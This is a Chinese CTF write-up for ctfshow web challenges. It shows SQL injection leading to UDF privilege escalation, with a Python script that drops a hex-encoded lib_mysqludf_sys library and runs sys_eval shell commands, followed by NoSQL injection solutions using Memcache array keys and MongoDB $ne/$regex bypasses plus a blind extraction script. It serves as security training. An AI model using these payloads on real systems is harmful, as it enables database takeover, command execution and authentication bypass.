<img src="\images\article_images\image-20250904153923044.png" alt="image-20250904153923044" style="zoom:80%;" />

&nbsp;



```php
/api?id=1';select sys_eval('ls /')%23
```

<img src="\images\article_images\image-20250904154630579.png" alt="image-20250904154630579" style="zoom:25%;" />

&nbsp;



**注意flag文件名为 `flag.here/n` ，需要使用通配符拿到flag内容**

```php
/api?id=1';select sys_eval('cat /fla*')%23
```

<img src="\images\article_images\image-20250904155146495.png" alt="image-20250904155146495" style="zoom:25%;" />

&nbsp;



**==题解二==**

**使用脚本解题**

<img src="\images\article_images\image-20250904231319829.png" alt="image-20250904231319829" style="zoom:80%;" />

```python
import requests

base_url="http://f66ef7b3-e460-42fe-88e3-c575cb08fc86.challenge.ctf.show/api/"
payload = []
text = ["a", "b", "c", "d", "e"]
udf = "7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180" \
"000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000" \
"000000000000000C414000000000000C41400000000000000002000000000000100000006000000C8140000000000" \
"00C814200000000000C81420000000000048020000000000005802000000000000000020000000000002000000060" \
"00000F814000000000000F814200000000000F8142000000000008001000000000000800100000000000008000000" \
"000000000400000004000000900100000000000090010000000000009001000000000000240000000000000024000" \
"00000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084" \
"000000000000008400000000000000040000000000000051E57464060000000000000000000000000000000000000" \
"00000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E" \
"5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A80000000011000000110000000200000007000000800802488" \
"11944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000" \
"001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E787" \
"22788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1C" \
"C3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000" \
"000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000" \
"000000250000002000000000000000000000000000000000000000CD0000001200000000000000000000000000000" \
"0000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000" \
"000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000" \
"000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000" \
"000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000" \
"000000000000000000000B200000012000000000000000000000000000000000000005A0100001200000000000000" \
"0000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000" \
"000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A9" \
"0F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B0" \
"09F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000" \
"F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001" \
"000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A00000000000000250100" \
"0012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B0" \
"0000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000" \
"790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000" \
"000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E0000000000006700000000" \
"0000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B00000" \
"0000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66" \
"696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D79737" \
"16C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E66" \
"6F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E69740073797" \
"35F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974" \
"006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735" \
"F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F" \
"6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6" \
"F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F" \
"7374617274005F656E6400474C4942435F322E322E350000000000000000000002000200020002000200020002000" \
"200020002000200020002000100010001000100010001000100010001000100010001000100010001000100010001" \
"0001000100010001006F0100001000000000000000751A6909000002009101000000000000F014200000000000080" \
"0000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000" \
"060000000300000000000000000000008816200000000000060000000A0000000000000000000000A816200000000" \
"00007000000040000000000000000000000B01620000000000007000000050000000000000000000000B816200000" \
"00000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C816200" \
"00000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816" \
"200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E" \
"816200000000000070000000C0000000000000000000000F016200000000000070000000D00000000000000000000" \
"00F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000" \
"000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E87507000048" \
"83C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C2000680100000" \
"0E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C2000680400" \
"0000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C2000680" \
"7000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000" \
"680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC084" \
"88B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833D" \
"D00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB0" \
"34883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B20" \
"00015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA70" \
"92000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0D" \
"E7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897" \
"DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8" \
"BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488" \
"975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB2048" \
"8D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E" \
"54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFF" \
"FF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F" \
"8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F" \
"0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488" \
"B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45" \
"F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F84" \
"8895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB80100" \
"0000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C" \
"7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45" \
"E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04" \
"889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45" \
"E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C" \
"60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0" \
"488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B" \
"800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E54889" \
"7DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFF" \
"F4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0" \
"488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4" \
"889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0" \
"FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBF" \
"FFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D" \
"85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF4" \
"88985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8" \
"480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488" \
"B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF48" \
"8D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909" \
"090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF" \
"75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656" \
"420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C75" \
"64665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E65207374726" \
"96E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F206172" \
"67756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D65746" \
"57200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF" \
"9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAF" \
"FFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FE" \
"FCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C07089001000" \
"01C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00" \
"000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C0" \
"70800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FF" \
"FF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D060" \
"25E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000" \
"DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E1086024" \
"30D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C" \
"010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E1" \
"08602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C00" \
"0000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF550100000" \
"0410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFF" \
"FF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C000000000" \
"0000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B80100000000000005000000" \
"00000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000" \
"000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014" \
"000000000000000700000000000000170000000000000050080000000000000700000000000000F00700000000000" \
"00800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D00700000000" \
"0000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F00000000010000000" \
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
"00000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000" \
"C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000" \
"000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A000000" \
"0000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D34290" \
"04743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3137290000" \
"2E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E6" \
"76E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273" \
"696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726" \
"F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A63" \
"72002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6" \
"D6D656E74000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
"00000000000000000000000000000000000000000000001B000000070000000200000000000000900100000000000" \
"0900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FF" \
"FF6F0200000000000000B801000000000000B801000000000000B4000000000000000300000000000000080000000" \
"00000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300" \
"000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E80" \
"5000000000000E8050000000000009D01000000000000000000000000000001000000000000000000000000000000" \
"48000000FFFFFF6F0200000000000000860700000000000086070000000000004A000000000000000300000000000" \
"0000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000" \
"000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000" \
"000000000F007000000000000F0070000000000006000000000000000030000000000000008000000000000001800" \
"0000000000006E0000000400000002000000000000005008000000000000500800000000000038010000000000000" \
"30000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000" \
"008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010" \
"000000600000000000000A009000000000000A009000000000000E000000000000000000000000000000004000000" \
"0000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C8060" \
"000000000000000000000000000100000000000000000000000000000008400000001000000060000000000000048" \
"1100000000000048110000000000000E0000000000000000000000000000000400000000000000000000000000000" \
"08A00000001000000020000000000000058110000000000005811000000000000EC00000000000000000000000000" \
"000008000000000000000000000000000000920000000100000002000000000000004412000000000000441200000" \
"00000008400000000000000000000000000000004000000000000000000000000000000A000000001000000020000" \
"0000000000C812000000000000C812000000000000FC0100000000000000000000000000000800000000000000000" \
"0000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000" \
"000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000" \
"000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B800000001" \
"0000000300000000000000E814200000000000E814000000000000080000000000000000000000000000000800000" \
"0000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800" \
"000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F" \
"814200000000000F81400000000000080010000000000000400000000000000080000000000000010000000000000" \
"00D300000001000000030000000000000078162000000000007816000000000000180000000000000000000000000" \
"0000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000" \
"000000008000000000000000000000000000000008000000000000000800000000000000E10000000800000003000" \
"000000000001017200000000000101700000000000010000000000000000000000000000000080000000000000000" \
"00000000000000E600000001000000300000000000000000000000000000001017000000000000590000000000000" \
"000000000000000000100000000000000010000000000000011000000030000000000000000000000000000000000" \
"00006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000" \
"200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C000000080000" \
"00000000001800000000000000090000000300000000000000000000000000000000000000C026000000000000420" \
"300000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000" \
"00000000000000000000000003000100900100000000000000000000000000000000000003000200B801000000000" \
"00000000000000000000000000003000300700200000000000000000000000000000000000003000400E805000000" \
"00000000000000000000000000000003000500860700000000000000000000000000000000000003000600D007000" \
"00000000000000000000000000000000003000700F007000000000000000000000000000000000000030008005008" \
"00000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A" \
"00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C" \
"00481100000000000000000000000000000000000003000D005811000000000000000000000000000000000000030" \
"00E00441200000000000000000000000000000000000003000F00C812000000000000000000000000000000000000" \
"03001000C81420000000000000000000000000000000000003001100D814200000000000000000000000000000000" \
"00003001200E81420000000000000000000000000000000000003001300F014200000000000000000000000000000" \
"00000003001400F814200000000000000000000000000000000000030015007816200000000000000000000000000" \
"000000000030016009016200000000000000000000000000000000000030017001017200000000000000000000000" \
"00000000000003001800000000000000000000000000000000000100000002000B00800A000000000000000000000" \
"0000000110000000400F1FF000000000000000000000000000000001C00000001001000C814200000000000000000" \
"00000000002A00000001001100D81420000000000000000000000000003800000001001200E814200000000000000" \
"00000000000004500000002000B00A00A00000000000000000000000000005B000000010017001017200000000000" \
"01000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B000000000" \
"0000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D014200000" \
"00000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E814200" \
"0000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF0000" \
"0000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F" \
"0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1" \
"FFF81420000000000000000000000000000D01000012000B00D10D000000000000D10000000000000015010000120" \
"00B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D010000" \
"20000000000000000000000000000000000000004101000012000C004811000000000000000000000000000047010" \
"00012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B" \
"01000012000000000000000000000000000000000000007F01000012000B00A20E000000000000670000000000000" \
"08D01000012000B00B30F000000000000550100000000000096010000120000000000000000000000000000000000" \
"0000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F10000000" \
"0000000D30100001200000000000000000000000000000000000000E5010000120000000000000000000000000000" \
"0000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B000000000000490" \
"00000000000002802000022000000000000000000000000000000000000004402000012000B00A60D000000000000" \
"2B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C000000000" \
"0000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F000000" \
"0000006700000000000000910200001200000000000000000000000000000000000000A5020000120000000000000" \
"0000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF1017" \
"2000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF2" \
"0172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B" \
"00090F0000000000000A000000000000000D030000120000000000000000000000000000000000000022030000100" \
"0F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C030000" \
"12000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E6" \
"3005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F" \
"5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E363335340" \
"06672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F45" \
"4E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005" \
"F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F" \
"005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5" \
"265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F63404047" \
"4C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E697400737" \
"9735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E66" \
"6F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4" \
"040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F" \
"7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7" \
"365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040" \
"474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E35006" \
"76574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973" \
"716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657" \
"865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E404047" \
"4C4942435F322E322E35005F696E697400"
for i in range(0,21510, 5000):
    end = i + 5000
    payload.append(udf[i:end])

p = dict(zip(text, payload))

for t in text:
    url = base_url+"?id=';select unhex('{}') into dumpfile '/usr/lib/mariadb/plugin/{}.txt'--+&page=1&limit=10".format(p[t], t) #UDF提权一般配合dumpfile 而不是outfile
    r = requests.get(url)
    print(r.status_code)

next_url = base_url+"?id=';select concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'),load_file('/usr/lib/mariadb/plugin/e.txt')) into dumpfile '/usr/lib/mariadb/plugin/udf.so'-- +&page=1&limit=10" #将各个txt文件合并到udf.so
rn = requests.get(next_url)

uaf_url=base_url+"?id=';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';--+"#创建udf函数
r=requests.get(uaf_url)
nn_url = base_url+"?id=';select sys_eval('cat /flag.*');-- +&page=1&limit=10"#执行命令并查看
rnn = requests.get(nn_url)
print(rnn.text)
```

&nbsp;



---

# web249

```sql
nosql注入


sql语句
  //无
  $user = $memcache->get($id);
    
    
返回逻辑
  //无过滤
```

 从 **Memcache 缓存服务器** 中，取出键名为 `$id` 的缓存数据，并赋值给 `$user`。

&nbsp;



**`Memcache::get`：从服务端检回一个元素**

**如果服务端之前有以key作为key存储的元素，`Memcache::get()` 方法此时返回之前存储的值**

**可以给 `Memcache::get()` 方法传递一个数组（多个key）来获取一个数组的元素值，返回的数组仅仅包含从服务端查找到的 key-value 对**

&nbsp;



**`id` 为数字类型，使用数组绕过**

```php
/api?id[]=flag
```

<img src="\images\article_images\image-20250904162617834.png" alt="image-20250904162617834" style="zoom:25%;" />

&nbsp;



---

# web250

```sql
nosql注入


sql语句
  $query = new MongoDB\Driver\Query($data);
  $cursor = $manager->executeQuery('ctfshow.ctfshow_user', $query)->toArray();
    
    
返回逻辑
  //无过滤
  if(count($cursor)>0){
    $ret['msg']='登陆成功';
    array_push($ret['data'], $flag);
  }
```

&nbsp;



**1.`$query = new MongoDB\Driver\Query($data);`** 

**`MongoDB\Driver\Query` 是 MongoDB 驱动提供的查询对象。**

**`$data` 是一个数组（通常类似 `['id' => 123]` 或 `['username' => 'abc']`），表示查询条件。**

**`$query = new MongoDB\Driver\Query($data);` 的意思是把查询条件封装成一个 MongoDB 查询对象，方便后面执行。**

&nbsp;



**2.`$cursor = $manager->executeQuery('ctfshow.ctfshow_user', $query)->toArray();`**

**`$manager` 是 MongoDB 的连接管理对象，类似数据库连接。**

**`executeQuery('ctfshow.ctfshow_user', $query)` 表示在 ctfshow 数据库的 ctfshow_user 集合里执行这个查询。**

**返回值 `$cursor` 是一个 游标对象（Cursor），表示查询结果集合。**

**`->toArray()` 把游标里的所有结果转换成一个 PHP 数组，方便访问。**

&nbsp;



> **MongoDB 查询条件的操作符**：
>
> 1️⃣ **比较操作符**
>
> | 符号   | 含义               | 示例                                                         |
> | ------ | ------------------ | ------------------------------------------------------------ |
> | `$gt`  | 大于 `>`           | `{ age: { $gt: 18 } }` → 年龄大于 18                         |
> | `$lt`  | 小于 `<`           | `{ age: { $lt: 18 } }` → 年龄小于 18                         |
> | `$gte` | 大于等于 `>=`      | `{ age: { $gte: 18 } }` → 年龄 ≥ 18                          |
> | `$lte` | 小于等于 `<=`      | `{ age: { $lte: 18 } }` → 年龄 ≤ 18                          |
> | `$ne`  | 不等于 `!=`        | `{ age: { $ne: 18 } }` → 年龄不等于 18                       |
> | `$in`  | 在指定数组内       | `{ age: { $in: [18,19,20] } }` → 年龄是 18、19、20 中的一个  |
> | `$nin` | 不在指定数组内     | `{ age: { $nin: [18,19,20] } }` → 年龄不是 18、19、20 中的任何一个 |
> | `$all` | 包含数组中所有元素 | `{ tags: { $all: ["red","big"] } }` → tags 必须同时有 "red" 和 "big" |
>
> &nbsp;
>
> 
>
> **2️⃣ 逻辑操作符**
>
> | 符号   | 含义        | 示例                                                |
> | ------ | ----------- | --------------------------------------------------- |
> | `$or`  | 或条件      | `{ $or: [ {age:18}, {age:20} ] }` → 年龄是 18 或 20 |
> | `$not` | 取反/反匹配 | `{ age: { $not: { $gt: 18 } } }` → 年龄 ≤ 18        |
>
> &nbsp;
>
> 
>
> **3️⃣ 模糊查询（正则）**
>
> - 使用 `$regex` 做类似 SQL `LIKE` 的模糊匹配：
>
> ```javascript
> db.customer.find({ name: { $regex: '.*s.*' } })
> ```
>
> - 意思是：查询名字里 **包含字母 s** 的用户。
> - `.*` 表示任意字符任意长度。
>
> &nbsp;
>
> 
>
> **4️⃣ 范围查询示例**
>
> ```javascript
> { "age": { "$gte": 2, "$lte": 21 } } // 2 <= age <= 21
> { "age": { "$ne": 23 } }             // age != 23
> { "age": { "$lt": 23 } }             // age < 23
> ```

&nbsp;



**查看源代码找到post请求**

<img src="\images\article_images\image-20250904170052785.png" alt="image-20250904170052785" style="zoom:25%;" />

&nbsp;



```php
#GET
/api/index.php

#POST
username[$ne]=1&password[$ne]=1
```

&nbsp;



---

# web251

```sql
nosql注入


sql语句
  $query = new MongoDB\Driver\Query($data);
  $cursor = $manager->executeQuery('ctfshow.ctfshow_user', $query)->toArray();
    
    
返回逻辑
  //无过滤
  if(count($cursor)>0){
    $ret['msg']='登陆成功';
    array_push($ret['data'], $flag);
  }
```

&nbsp;





```php
#GET
/api/index.php

#POST
username[$ne]=1&password[$ne]=1
username[$ne]=admin&password[$ne]=1
```

<img src="\images\article_images\image-20250904171914214.png" alt="image-20250904171914214" style="zoom:25%;" />

&nbsp;



---

# web252

```sql
nosql注入


sql语句
  //sql
  db.ctfshow_user.find({username:'$username',password:'$password'}).pretty()
    
    
返回逻辑
  //无过滤
  if(count($cursor)>0){
    $ret['msg']='登陆成功';
    array_push($ret['data'], $flag);
  }
```

**`db.ctfshow_user.find({username:'$username',password:'$password'}).pretty()` ：在 `ctfshow_user` 表里查找 用户名和密码同时匹配的用户，并把结果以漂亮格式打印出来**

&nbsp;



```php
#GET
/api/index.php

#POST
username[$ne]=1&password[$regex]=ctfshow{
```

<img src="\images\article_images\image-20250904171324967.png" alt="image-20250904171324967" style="zoom:25%;" />

&nbsp;



---

# web253

```sql
nosql注入


sql语句
  //sql
  db.ctfshow_user.find({username:'$username',password:'$password'}).pretty()
    
    
返回逻辑
  //无过滤
  if(count($cursor)>0){
    $ret['msg']='登陆成功';
    array_push($ret['data'], $flag);
  }
```

&nbsp;



**经过测试，`username` 为 `flag` ，但是页面不会回显数据，采用脚本盲注**

```php
username[$regex]=flag&password[$ne]=1
```

<img src="\images\article_images\image-20250904173050917.png" alt="image-20250904173050917" style="zoom:25%;" />



&nbsp;



<img src="\images\article_images\image-20250904173225468.png" alt="image-20250904173225468" style="zoom:80%;" />

```python
import requests
import string
import time

url = 'http://a9f047cc-a3f5-4146-a5ef-8c652481cd86.challenge.ctf.show/api/'
dic = string.digits + string.ascii_lowercase + '{}-_'
out = 'ctfshow{'

for j in range(9, 50):
    for k in dic:
        payload = {'username[$ne]': '1', 'password[$regex]': f'^{out+k}'}
        try:
            re = requests.post(url, data=payload)
            if "\\u767b\\u9646\\u6210\\u529f" in re.text:  # 反斜杠进行转义
                out += k
                print(out)
                break
        except requests.exceptions.RequestException as e:
            print(f"请求失败: {e}")
        time.sleep(0.5)  # 添加请求间隔
```

